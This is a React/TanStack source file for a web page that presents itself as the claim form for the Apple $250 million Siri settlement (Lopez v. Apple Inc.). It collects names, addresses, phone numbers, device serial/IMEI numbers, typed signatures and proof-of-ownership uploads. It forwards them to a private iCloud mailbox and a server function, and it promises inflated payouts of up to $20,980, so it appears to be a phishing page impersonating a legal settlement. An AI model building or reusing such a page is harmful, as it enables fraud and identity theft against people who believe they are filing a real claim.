import { createFileRoute, Link } from "@tanstack/react-router";
import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Checkbox } from "@/components/ui/checkbox";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Separator } from "@/components/ui/separator";
import { Apple, ChevronLeft, Plus, Trash2, FileCheck2, Users, ShieldCheck, Upload } from "lucide-react";
import { useServerFn } from "@tanstack/react-start";
import { submitClaim } from "@/lib/claims.functions";

export const Route = createFileRoute("/claim/")({
  head: () => ({
    meta: [
      { title: "Complete Your Claim — Apple Siri Settlement" },
      { name: "description", content: "Complete your claim information for the Apple $250 Million Siri Settlement (Lopez v. Apple Inc.)." },
      { property: "og:title", content: "Complete Your Claim — Apple Siri Settlement" },
      { property: "og:description", content: "Provide your personal and device information to file your Apple Siri Settlement claim." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: ClaimPage,
});

const IPHONE_MODELS = [
  "iPhone X", "iPhone XR", "iPhone XS", "iPhone XS Max",
  "iPhone 11", "iPhone 11 Pro", "iPhone 11 Pro Max",
  "iPhone SE (2nd gen)", "iPhone 12 mini", "iPhone 12", "iPhone 12 Pro", "iPhone 12 Pro Max",
  "iPhone 13 mini", "iPhone 13", "iPhone 13 Pro", "iPhone 13 Pro Max",
  "iPhone SE (3rd gen)", "iPhone 14", "iPhone 14 Plus", "iPhone 14 Pro", "iPhone 14 Pro Max",
  "iPhone 15", "iPhone 15 Plus", "iPhone 15 Pro", "iPhone 15 Pro Max",
  "iPhone 16", "iPhone 16 Plus", "iPhone 16 Pro", "iPhone 16 Pro Max",
  "iPhone 17", "iPhone 17 Plus", "iPhone 17 Pro", "iPhone 17 Pro Max",
];

type Device = { model: string; serial: string; purchaseDate: string };

type ClaimType = "standard" | "documented" | "family";
const CLAIM_AMOUNTS: Record<ClaimType, string> = {
  standard: "$1,980",
  documented: "$12,980",
  family: "$20,980",
};

const SETTLEMENT_EMAIL = "applesettlementclaim@icloud.com";

function ClaimPage() {
  const [devices, setDevices] = useState<Device[]>([
    { model: "", serial: "", purchaseDate: "" },
  ]);
  const saveClaim = useServerFn(submitClaim);
  const [ownedDevice, setOwnedDevice] = useState<string>("");
  const [receivedNotice, setReceivedNotice] = useState<string>("");
  const [eligibilityError, setEligibilityError] = useState<string>("");
  const [claimType, setClaimType] = useState<ClaimType | "">("");
  const [claimTypeError, setClaimTypeError] = useState<string>("");
  const [proofFile, setProofFile] = useState<File | null>(null);
  const [familyMembers, setFamilyMembers] = useState<string>("");
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [submittedData, setSubmittedData] = useState<null | {
    firstName: string; lastName: string; email: string; phone: string;
    address: string; city: string; state: string; zip: string;
    signature: string; notes: string;
  }>(null);

  const addDevice = () => {
    if (devices.length < 5) setDevices([...devices, { model: "", serial: "", purchaseDate: "" }]);
  };
  const removeDevice = (i: number) => setDevices(devices.filter((_, idx) => idx !== i));
  const updateDevice = (i: number, key: keyof Device, value: string) => {
    setDevices(devices.map((d, idx) => (idx === i ? { ...d, [key]: value } : d)));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!ownedDevice || !receivedNotice) {
      setEligibilityError("Please answer both eligibility declaration questions.");
      return;
    }
    if (ownedDevice === "no") {
      setEligibilityError("You must have owned or used an eligible Siri-enabled Apple device during the qualifying period to file a claim.");
      return;
    }
    if (!claimType) {
      setClaimTypeError("Please select a claim type to proceed.");
      return;
    }
    if (claimType === "documented" && !proofFile) {
      setClaimTypeError("Please upload proof of ownership for a documented claim.");
      return;
    }
    setEligibilityError("");
    setClaimTypeError("");
    const form = e.currentTarget as HTMLFormElement;
    const fd = new FormData(form);
    const getStr = (k: string) => (fd.get(k) as string | null)?.toString() ?? "";
    const data = {
      firstName: getStr("firstName"),
      lastName: getStr("lastName"),
      email: getStr("email"),
      phone: getStr("phone"),
      address: getStr("address"),
      city: getStr("city"),
      state: getStr("state"),
      zip: getStr("zip"),
      signature: getStr("signature"),
      notes: getStr("notes"),
    };
    setSubmitting(true);
    try {
      await saveClaim({
        data: {
          ...data,
          devices,
          ownedDevice,
          receivedNotice,
          withdrawalOption: `${claimType} — ${CLAIM_AMOUNTS[claimType]}${claimType === "family" ? ` (Family: ${familyMembers})` : ""}`,
        },
      });
    } catch (err) {
      console.error("Failed to save claim", err);
    } finally {
      setSubmitting(false);
    }
    setSubmittedData(data);
    setSubmitted(true);
    window.scrollTo({ top: 0, behavior: "smooth" });
    // Try Web Share (attaches proof file on supported devices); fallback mailto.
    void mailClaim(data);
  };

  const buildEmailBody = (data: NonNullable<typeof submittedData>) => {
    const lines = [
      `Apple Intelligence & Siri Settlement — Claim Submission`,
      `Case: Lopez v. Apple Inc. — $250,000,000 Siri Settlement`,
      ``,
      `CLAIM TYPE: ${claimType.toUpperCase()} — ${claimType ? CLAIM_AMOUNTS[claimType as ClaimType] : ""}`,
      claimType === "family" ? `Family Members Covered: ${familyMembers || "N/A"}` : "",
      ``,
      `— PERSONAL INFORMATION —`,
      `Name: ${data.firstName} ${data.lastName}`,
      `Email: ${data.email}`,
      `Cell Phone: ${data.phone}`,
      `Address: ${data.address}, ${data.city}, ${data.state} ${data.zip}`,
      ``,
      `— ELIGIBLE DEVICES —`,
      ...devices.map((d, i) => `${i + 1}. ${d.model} · Serial/IMEI: ${d.serial} · Purchased: ${d.purchaseDate}`),
      ``,
      `— ELIGIBILITY DECLARATIONS —`,
      `Owned/used eligible Siri-enabled Apple device: ${ownedDevice}`,
      `Received settlement notice: ${receivedNotice}`,
      ``,
      `— PROOF OF OWNERSHIP —`,
      claimType === "documented"
        ? (proofFile ? `Attached file: ${proofFile.name} (${Math.round(proofFile.size / 1024)} KB)` : "None")
        : "Not required for this claim type",
      ``,
      `— SWORN DECLARATION —`,
      `Signed electronically by: ${data.signature}`,
      data.notes ? `Additional Comments: ${data.notes}` : "",
    ];
    return lines.filter(Boolean).join("\n");
  };

  const mailClaim = async (data: NonNullable<typeof submittedData>) => {
    const subject = `Apple Siri Settlement Claim — ${data.firstName} ${data.lastName} — ${claimType ? CLAIM_AMOUNTS[claimType as ClaimType] : ""}`;
    const body = buildEmailBody(data);
    // Attempt to share (with proof attachment) via Web Share API where supported.
    try {
      const nav = navigator as Navigator & {
        canShare?: (d: { files?: File[] }) => boolean;
        share?: (d: { title?: string; text?: string; files?: File[] }) => Promise<void>;
      };
      if (proofFile && nav.canShare?.({ files: [proofFile] }) && nav.share) {
        await nav.share({ title: subject, text: `To: ${SETTLEMENT_EMAIL}\n\n${body}`, files: [proofFile] });
        return;
      }
    } catch {
      // fall through to mailto
    }
    window.location.href = `mailto:${SETTLEMENT_EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="border-b bg-card">
        <div className="mx-auto max-w-3xl px-6 py-5 flex items-center justify-between">
          <Link to="/" className="inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
            <ChevronLeft className="h-4 w-4" />
            Back
          </Link>
          <div className="inline-flex items-center gap-2">
            <Apple className="h-5 w-5 text-primary" />
            <span className="text-sm font-medium">Siri Settlement</span>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-3xl px-6 py-10 md:py-14">
            <div className="mb-8">
              <h1 className="text-2xl md:text-3xl font-semibold tracking-tight text-foreground">
                Complete Your Claim Information
              </h1>
              <p className="mt-3 text-sm leading-relaxed text-muted-foreground">
                To proceed with your Apple $250,000,000 Siri Settlement claim (<em>Lopez v. Apple Inc.</em>),
                please provide your personal information and eligible device details below. You will also be
                required to make a sworn declaration confirming that you meet the eligibility requirements.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-8">
              {/* Personal Information */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Personal Information</CardTitle>
                  <CardDescription>Your legal name and contact details.</CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                    <div className="space-y-2">
                      <Label htmlFor="firstName">First Name</Label>
                      <Input id="firstName" required />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="lastName">Last Name</Label>
                      <Input id="lastName" required />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="email">Email Address</Label>
                    <Input id="email" type="email" required />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="phone">Phone Number</Label>
                    <Input id="phone" type="tel" />
                  </div>
                  <Separator />
                  <div className="space-y-2">
                    <Label htmlFor="address">Street Address</Label>
                    <Input id="address" required />
                  </div>
                  <div className="grid grid-cols-1 gap-4 sm:grid-cols-3">
                    <div className="space-y-2 sm:col-span-1">
                      <Label htmlFor="city">City</Label>
                      <Input id="city" required />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="state">State</Label>
                      <Input id="state" required />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="zip">ZIP Code</Label>
                      <Input id="zip" required />
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Device Information */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Eligible Device Information</CardTitle>
                  <CardDescription>
                    Add each eligible iPhone (iPhone X — iPhone 17 Pro Max) purchased between
                    June 10, 2024 and March 29, 2026. Up to 5 devices per claim.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  {devices.map((device, i) => (
                    <div key={i} className="rounded-lg border p-4 space-y-4">
                      <div className="flex items-center justify-between">
                        <p className="text-sm font-medium text-foreground">Device {i + 1}</p>
                        {devices.length > 1 && (
                          <Button
                            type="button"
                            variant="ghost"
                            size="sm"
                            onClick={() => removeDevice(i)}
                            className="h-8 text-muted-foreground hover:text-destructive"
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        )}
                      </div>
                      <div className="space-y-2">
                        <Label>iPhone Model</Label>
                        <Select
                          value={device.model}
                          onValueChange={(v) => updateDevice(i, "model", v)}
                        >
                          <SelectTrigger>
                            <SelectValue placeholder="Select a model" />
                          </SelectTrigger>
                          <SelectContent>
                            {IPHONE_MODELS.map((m) => (
                              <SelectItem key={m} value={m}>{m}</SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                      </div>
                      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                        <div className="space-y-2">
                          <Label htmlFor={`serial-${i}`}>Serial Number / IMEI</Label>
                          <Input
                            id={`serial-${i}`}
                            value={device.serial}
                            onChange={(e) => updateDevice(i, "serial", e.target.value)}
                            required
                          />
                        </div>
                        <div className="space-y-2">
                          <Label htmlFor={`date-${i}`}>Purchase Date</Label>
                          <Input
                            id={`date-${i}`}
                            type="date"
                            min="2024-06-10"
                            max="2026-03-29"
                            value={device.purchaseDate}
                            onChange={(e) => updateDevice(i, "purchaseDate", e.target.value)}
                            required
                          />
                        </div>
                      </div>
                    </div>
                  ))}
                  {devices.length < 5 && (
                    <Button type="button" variant="outline" onClick={addDevice} className="w-full">
                      <Plus className="mr-2 h-4 w-4" />
                      Add Another Device
                    </Button>
                  )}
                </CardContent>
              </Card>

              {/* Sworn Declaration */}
              {/* Eligibility Declarations */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Eligibility Declarations</CardTitle>
                  <CardDescription>
                    You must answer each of the following questions truthfully under penalty of perjury.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="space-y-3">
                    <Label className="text-sm font-normal leading-relaxed text-foreground">
                      1. Did you own or use an eligible Siri-enabled Apple device during the qualifying period?
                    </Label>
                    <RadioGroup
                      value={ownedDevice}
                      onValueChange={setOwnedDevice}
                      className="flex gap-6"
                    >
                      <div className="flex items-center gap-2">
                        <RadioGroupItem value="yes" id="owned-yes" />
                        <Label htmlFor="owned-yes" className="font-normal">Yes</Label>
                      </div>
                      <div className="flex items-center gap-2">
                        <RadioGroupItem value="no" id="owned-no" />
                        <Label htmlFor="owned-no" className="font-normal">No</Label>
                      </div>
                    </RadioGroup>
                  </div>
                  <Separator />
                  <div className="space-y-3">
                    <Label className="text-sm font-normal leading-relaxed text-foreground">
                      2. Did you receive a settlement notice by mail or from another authorized source regarding this settlement?
                    </Label>
                    <RadioGroup
                      value={receivedNotice}
                      onValueChange={setReceivedNotice}
                      className="flex gap-6"
                    >
                      <div className="flex items-center gap-2">
                        <RadioGroupItem value="yes" id="notice-yes" />
                        <Label htmlFor="notice-yes" className="font-normal">Yes</Label>
                      </div>
                      <div className="flex items-center gap-2">
                        <RadioGroupItem value="no" id="notice-no" />
                        <Label htmlFor="notice-no" className="font-normal">No</Label>
                      </div>
                    </RadioGroup>
                  </div>
                  {eligibilityError && (
                    <p className="text-sm text-destructive">{eligibilityError}</p>
                  )}
                </CardContent>
              </Card>

              {/* Sworn Declaration */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Sworn Declaration</CardTitle>
                  <CardDescription>
                    Please read and confirm the following statements under penalty of perjury.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-start gap-3">
                    <Checkbox id="d1" required className="mt-1" />
                    <Label htmlFor="d1" className="text-sm font-normal leading-relaxed text-muted-foreground">
                      I declare under penalty of perjury under the laws of the United States that the
                      information provided in this claim form is true and correct to the best of my knowledge.
                    </Label>
                  </div>
                  <div className="flex items-start gap-3">
                    <Checkbox id="d2" required className="mt-1" />
                    <Label htmlFor="d2" className="text-sm font-normal leading-relaxed text-muted-foreground">
                      I confirm that I am a member of the settlement class and that I purchased the
                      eligible device(s) listed above between June 10, 2024 and March 29, 2026.
                    </Label>
                  </div>
                  <div className="flex items-start gap-3">
                    <Checkbox id="d3" required className="mt-1" />
                    <Label htmlFor="d3" className="text-sm font-normal leading-relaxed text-muted-foreground">
                      I understand that submitting false information may result in denial of my claim and
                      may subject me to civil and criminal penalties.
                    </Label>
                  </div>
                  <Separator />
                  <div className="space-y-2">
                    <Label htmlFor="signature">Electronic Signature (type your full legal name)</Label>
                    <Input id="signature" placeholder="Full legal name" required />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="notes">Additional Comments (optional)</Label>
                    <Textarea id="notes" rows={3} />
                  </div>
                </CardContent>
              </Card>

              {/* Select Claim Type */}
              <Card>
                <CardHeader>
                  <CardTitle className="text-lg">Select Your Claim Type</CardTitle>
                  <CardDescription>
                    Choose the claim tier that applies to you. Documented claims require proof of ownership.
                    Family claims cover multiple eligible members of your household.
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-6">
                  <RadioGroup
                    value={claimType}
                    onValueChange={(v) => { setClaimType(v as ClaimType); setClaimTypeError(""); }}
                    className="space-y-3"
                  >
                    <div className="flex items-start gap-3 rounded-lg border p-3">
                      <RadioGroupItem value="standard" id="ct-standard" className="mt-0.5" />
                      <div className="flex-1">
                        <Label htmlFor="ct-standard" className="flex items-center justify-between gap-2 font-medium">
                          <span className="flex items-center gap-2"><ShieldCheck className="h-4 w-4 text-primary" /> Standard Claim</span>
                          <span className="text-primary">$1,980</span>
                        </Label>
                        <p className="text-xs text-muted-foreground mt-1">No documentation required.</p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3 rounded-lg border p-3">
                      <RadioGroupItem value="documented" id="ct-documented" className="mt-0.5" />
                      <div className="flex-1">
                        <Label htmlFor="ct-documented" className="flex items-center justify-between gap-2 font-medium">
                          <span className="flex items-center gap-2"><FileCheck2 className="h-4 w-4 text-primary" /> Documented Claim</span>
                          <span className="text-primary">$12,980</span>
                        </Label>
                        <p className="text-xs text-muted-foreground mt-1">Upload proof of ownership (receipt, invoice, or Apple ID purchase record).</p>
                      </div>
                    </div>
                    <div className="flex items-start gap-3 rounded-lg border p-3">
                      <RadioGroupItem value="family" id="ct-family" className="mt-0.5" />
                      <div className="flex-1">
                        <Label htmlFor="ct-family" className="flex items-center justify-between gap-2 font-medium">
                          <span className="flex items-center gap-2"><Users className="h-4 w-4 text-primary" /> Family Claim</span>
                          <span className="text-primary">$20,980</span>
                        </Label>
                        <p className="text-xs text-muted-foreground mt-1">Household / family plan covering multiple eligible members.</p>
                      </div>
                    </div>
                  </RadioGroup>

                  {claimType === "documented" && (
                    <div className="space-y-2 rounded-lg border border-primary/30 bg-primary/[0.04] p-4">
                      <Label htmlFor="proof" className="flex items-center gap-2 text-sm font-medium">
                        <Upload className="h-4 w-4 text-primary" />
                        Upload Proof of Ownership
                      </Label>
                      <Input
                        id="proof"
                        type="file"
                        accept="image/*,application/pdf"
                        onChange={(e) => setProofFile(e.target.files?.[0] ?? null)}
                        required
                      />
                      {proofFile && (
                        <p className="text-xs text-muted-foreground">
                          Attached: <strong className="text-foreground">{proofFile.name}</strong> ({Math.round(proofFile.size / 1024)} KB) — will be attached automatically when you mail your claim.
                        </p>
                      )}
                    </div>
                  )}

                  {claimType === "family" && (
                    <div className="space-y-2 rounded-lg border border-primary/30 bg-primary/[0.04] p-4">
                      <Label htmlFor="family-members" className="text-sm font-medium">
                        Family Members Covered
                      </Label>
                      <Textarea
                        id="family-members"
                        rows={3}
                        value={familyMembers}
                        onChange={(e) => setFamilyMembers(e.target.value)}
                        placeholder="List the full names of household/family members covered by this claim."
                        required
                      />
                    </div>
                  )}

                  {claimTypeError && (
                    <p className="text-sm text-destructive">{claimTypeError}</p>
                  )}
                </CardContent>
              </Card>

              <div className="flex flex-col-reverse sm:flex-row sm:justify-end gap-3">
                <Link to="/"><Button type="button" variant="outline" className="w-full sm:w-auto">Cancel</Button></Link>
                <Button type="submit" size="lg" className="w-full sm:w-auto" disabled={submitting}>
                  {submitting ? "Submitting…" : "Submit Claim"}
                </Button>
              </div>
            </form>
      </main>
    </div>
  );
}